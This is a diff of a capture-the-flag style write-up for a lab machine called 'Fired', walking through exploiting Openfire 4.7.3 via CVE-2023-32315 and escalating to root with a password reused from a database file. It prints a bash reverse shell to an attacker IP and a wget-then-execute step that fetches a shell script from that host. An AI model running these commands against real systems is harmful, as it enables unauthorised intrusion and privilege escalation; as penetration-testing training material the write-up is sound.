@@ -3,7 +3,7 @@
 # 🐧Fired🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.105.96            
 
 PORT     STATE SERVICE  VERSION
@@ -16,23 +16,23 @@ port 9091 is a empty page
 port 9090 is running openfire 4.7.3  
 we have no passwd for the page  
 google found the version is CVE-2023-32315
-```
+```console
 https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass?tab=readme-ov-file
 ```
 follow the instruction and upload to shell plugin to operfire and use RCE   
 for some reason, nc and python is not working in the RCE   
 so i created a script  
-```
+```console
 #!/bin/bash
 /bin/sh -i >& /dev/tcp/192.168.45.166/22 0>&1
 ```
 upload it to /tmp and execute
-```
+```console
 wget http://192.168.45.166/shell.sh -O /tmp/shell.sh
 
 bash /tmp/shell.sh
 ```
-```
+```console
 openfire@openfire:/tmp$ id
 uid=114(openfire) gid=118(openfire) groups=118(openfire)
 ```
@@ -41,14 +41,14 @@ uid=114(openfire) gid=118(openfire) groups=118(openfire)
 
 i check the linpeas output found 
 openfire has writable permission to some files
-```
+```console
 ╔══════════╣ Writable log files (logrotten) (limit 50)
 Writable: /var/log/openfire/openfire.log
 Writable: /var/lib/openfire/embedded-db/openfire.log
 ```
 but the log has nothing interested  
 however there is a file call openfire.script
-```
+```console
 openfire@openfire:/var/lib/openfire/embedded-db$ ls -la
 
 drwxr-x--- 3 openfire openfire  4096 Aug  5  2024 .
@@ -60,14 +60,14 @@ drwxr-x--- 4 openfire openfire  4096 Jun 28  2024 ..
 drwxr-xr-x 2 openfire openfire  4096 Jun 28  2024 openfire.tmp
 ```
 it has the password for smtp server
-```
+```console
 openfire@openfire:/var/lib/openfire/embedded-db$ cat openfire.script
 
 INSERT INTO OFPROPERTY VALUES('mail.smtp.host','localhost',0,NULL)
 INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
 ```
 but smtp server is not running
-```
+```console
 openfire@openfire:/$ netstat
 
 tcp        0    133 openfire:58364          192.168.45.166:ssh      ESTABLISHED
@@ -80,7 +80,7 @@ tcp6       1      0 openfire:9090           192.168.45.166:39118    CLOSE_WAIT
 
 ```
 try the password with root and success
-```
+```console
 openfire@openfire:/$ su root
 Password: OpenFireAtEveryone
 
